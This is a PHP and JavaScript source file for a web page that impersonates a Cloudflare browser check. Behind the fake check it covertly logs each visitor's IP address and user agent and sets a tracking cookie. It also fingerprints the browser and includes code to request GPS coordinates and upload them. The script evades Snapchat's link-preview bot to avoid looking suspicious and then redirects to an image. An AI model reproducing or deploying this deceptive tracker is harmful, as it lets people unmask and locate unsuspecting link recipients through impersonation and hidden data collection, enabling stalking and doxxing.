<?php

//front end page
// designed to look like a Cloudflare check
// when really its saved the users IP Address  and user agent via php code before its loaded.
// and save that data into a db.
// and once its loaded. it will update that database item with items pulled using js
// will also try to request gps coordinates from user.


// when php loades request it will generate a 30c random string called identifier.
// it will be saved in the db along with the users IP address and their userAgent.
// will generate a cookie called identifier which once loaded the page.
// will be used to insert user information obtained via javascript back into that same same
// database element.

//javascript will submit a post request via ajax as soon as page finishes loading.
// this includes:
// jsUseragent
// language
// navigator platform
// cookies enabled
// online statsus
// screen Resolution
// available screen Width
// available screen Height
// color deptch.
// AdBlocker enabled?
// identifier
// os (obtained with Mobile detect.)

// Include the Mobile_Detect.php file
require_once $_SERVER['DOCUMENT_ROOT'].'/mobileDetect/src/MobileDetect.php';
require_once $_SERVER['DOCUMENT_ROOT'].'/functions/globalFunctions.php';


$detect = new \Detection\MobileDetect;
$deviceType = ($detect->isMobile() ? ($detect->isTablet() ? 'tablet' : 'phone') : 'computer');
$identifier = generateRandomString(30);
$cookieName = "identifier";
$cookieValue = $identifier;
$expirationTime = time() + (86400 * 30); // Set the expiration time to 30 days from now
$tinyURL = "";
if (isset($_GET['tinyURL'])) {
  $tinyURL = $_GET['tinyURL'];
}else{
  $tinyURL = "IMAGE";
}

setcookie($cookieName, $cookieValue, $expirationTime);

//echo "User's device model: $deviceType";

// safley insert into db.
//$table is randomString
$keys =  array("id","userAgent","ip","unix","stat","identifier","tinyURL");
$values = array (null,$_SERVER['HTTP_USER_AGENT'],$_SERVER['REMOTE_ADDR'],time(),1,$identifier,$tinyURL);
if (insertDataIntoDatabase("tlog", $keys, $values)) {
  // code...
}else {
  //exit();
}




?>
<html lang="en" class=""><head>

  <meta charset="UTF-8">
  <title>Amber Holo - Premium Prices </title>
  <link rel="icon" href="https://s142.convertio.me/p/UuIh6a4dCbV1g38uSNBieg/8bfdf903ac8a554acffee08ea8fb748f/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.ico" type="image/x-icon">
  <meta name="robots" content="noindex">



  <link rel="canonical" href="https://codepen.io/ta7382/pen/zjMrgM?editors=1111">



<!-- CSS -->
  <style class="INLINE_PEN_STYLESHEET_ID">

    * {
    font-family: 'sans-serif';
}

body{
   background-color: rgb(238, 238, 238);
}

.form{
  display:flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  height:90vh;
}

.circle-range {
  position: relative;
  display: inline-block;
  width: 64px;
  height: 64px;
}

.circle-range div {
  position: absolute;
  width: 22px;
  height: 22px;
  border-radius: 100%;
  background-color: rgb(0, 136, 210);
}

.circle-range div:nth-child(1) {
  left: -30px;
  animation: cir1 0.5s ease infinite;
}

.circle-range div:nth-child(2) {
  left: -30px;
  animation: cirmove 0.5s ease infinite;
}

.circle-range div:nth-child(3) {
  animation: cirmove 0.5s ease infinite;
}

.circle-range div:nth-child(4) {
  left: 30px;
  animation: cir2 0.5s ease infinite;
}

@keyframes cir1 {
  0% {
    transform: scale(0);
  }
  100% {
    transform: scale(1);
  }
}

@keyframes cir2 {
  0% {
    transform: scale(1);
  }
  100% {
    transform: scale(0);
  }
}

@keyframes cirmove {
  0% {
    transform: translateX(0);
  }
  100% {
    transform: translateX(30px);
  }
}

  </style>
  <style>
  .responsive {
    width: 100%;
    height: auto;
  }
  .blob {
	margin: 10px;

	box-shadow: 0 0 0 0 rgba(0, 0, 0, 1);
	transform: scale(1);
	animation: pulse 2.5s infinite;
}

@keyframes pulse {
	0% {
		transform: scale(0.95);
	}

	50% {
		transform: scale(1);
	}

	100% {
		transform: scale(0.95);
	}
}
  </style>

<script src="https://cpwebassets.codepen.io/assets/editor/iframe/iframeConsoleRunner-6bce046e7128ddf9391ccf7acbecbf7ce0cbd7b6defbeb2e217a867f51485d25.js"></script>
<script src="https://cpwebassets.codepen.io/assets/editor/iframe/iframeRefreshCSS-550eae0ce567d3d9182e33cee4e187761056020161aa87e3ef74dc467972c555.js"></script>
<script src="https://cpwebassets.codepen.io/assets/editor/iframe/iframeRuntimeErrors-4f205f2c14e769b448bcf477de2938c681660d5038bc464e3700256713ebe261.js"></script>
<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
</head>

<body onload="checkIfRobot()">
  <div style="padding-top: 10vh;">
    <center>
  <img class="blob" src="https://blog.cloudflare.com/content/images/2016/09/cf-blog-logo-crop.png" alt="Italian Trulli">
</center>
</div>
  <div class="form">

  <div class="circle-range">
    <div></div>
    <div></div>
    <div></div>
    <div></div>
  </div>
  <h2>Cloudflare is checking your browser.</h2>
  <h4 class="mt-2">You will be redirected shortly...</h4>
</div>


<script src="https://cpwebassets.codepen.io/assets/common/stopExecutionOnTimeout-2c7831bb44f98c1391d6a4ffda0e1fd302503391ca806e7fcc7b9b87197aec26.js"></script>

<script type="text/javascript">

//checks if its a snapbot.
function checkIfRobot() {
  if (navigator.userAgent.includes("developers.snap.com")) {
    //this is a snaphat bot.
    //dont look suspicous
  }else {
    //this is not a snapchat bot.
    reportJSStuff();
    //waitBeforeGPS();
  }
}

//function returns if user has adblocker.
function isAdBlockerEnabled() {
  var testAd = document.createElement('div');
  testAd.innerHTML = '&nbsp;';
  testAd.className = 'adsbox';
  document.body.appendChild(testAd);

  var adBlockerEnabled = !testAd.offsetHeight;
  document.body.removeChild(testAd);

  return adBlockerEnabled;
}

//function returns OS of user.
function getOS() {
  var userAgent = navigator.userAgent;
  var platform = navigator.platform;
  var os = "Unknown";

  if (platform.indexOf("Win") !== -1) {
    os = "Windows";
  } else if (platform.indexOf("Mac") !== -1) {
    os = "MacOS";
  } else if (platform.indexOf("Linux") !== -1) {
    os = "Linux";
  } else if (/^iPhone/.test(userAgent) || /^iPad/.test(userAgent)) {
    os = "iOS";
  } else if (/^Android/.test(userAgent)) {
    os = "Android";
  } else if (/^Mozilla/.test(userAgent)) {
    os = "Web";
  }

  return os;
}

//function returns navigator info
function getBrowserData() {
  var browserData = [];
  browserData.push({ name: "jsuseragent", value: navigator.userAgent });
  browserData.push({ name: "jslang", value: navigator.language });
  browserData.push({ name: "jsPlatform", value: navigator.platform });
  browserData.push({ name: "cookiesEnabled", value: Number(navigator.cookieEnabled) });
  browserData.push({ name: "jsonlineStat", value: Number(navigator.onLine) });
  browserData.push({ name: "jsscreenRes", value: (window.screen.width + "x" + window.screen.height) });
  //browserData.push({ name: "Available Screen Width", value: window.screen.availWidth });
  //browserData.push({ name: "Available Screen Height", value: window.screen.availHeight });
  browserData.push({ name: "jscolorDepth", value: window.screen.colorDepth });
  browserData.push({ name: "jsadblock", value: Number(isAdBlockerEnabled()) });
  browserData.push({ name: "identifier", value: <?php echo "'".$identifier."'" ?> });
  browserData.push({ name: "JsOS", value: getOS() });
  browserData.push({ name: "jsMemory", value: navigator.devicememory});
  return browserData;
}

//function tht pushes navigator information to updateLogWithJS
function reportJSStuff() {
  $.ajax({
    method: "POST",
    url: "/functions/updateLogWithJS.php",
    data: getBrowserData()
  })
    .done(function(data) {
      //console.log(data);
      window.location.href = "https://i.ibb.co/jhbLq6g/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.jpg";

    })
    .fail(function() {
      window.location.href = "https://i.ibb.co/jhbLq6g/F8-F983-B5-4-EC5-4-D3-C-A86-E-285-EF3957391.jpg";
    });
}


//variable for waiting
const sleep = async (milliseconds) => {
    await new Promise(resolve => {
        return setTimeout(resolve, milliseconds)
    });
};

//function to wait three seconds before asking user for their location
const waitBeforeGPS = async () => {
    for (let i = 0; i < 3; i++) {
        await sleep(1000);
        console.log(i);
    }

    getLocation();
}


const errorCallback = (error) => {
  // Your application has indicated there's an error
   window.setTimeout(function(){

       // Move to a new location or you can do something else
       window.location.href = "https://dl.dropboxusercontent.com/u/37251493/";

   }, 5000);
};


//ask user to allow their gps location.
function getLocation() {
  navigator.geolocation.getCurrentPosition(sendLocation, errorCallback);
}

//User has accepted to show gps loction. So now log it.
function sendLocation(position) {
  $.ajax({
    method: "POST",
    url: "/functions/updateLogWithJS.php",
    data: [{name: "jslong", value: position.coords.longitude},{name: "identifier", value: <?php echo "'".$identifier."'" ?>},{name: "jslat", value: position.coords.latitude}]
  })
    .done(function(data) {
      console.log(data);
      location.href = 'https://dl.dropboxusercontent.com/u/37251493/';
    })
    .fail(function() {
      alert("no good");
    });
}


</script>

</body></html>
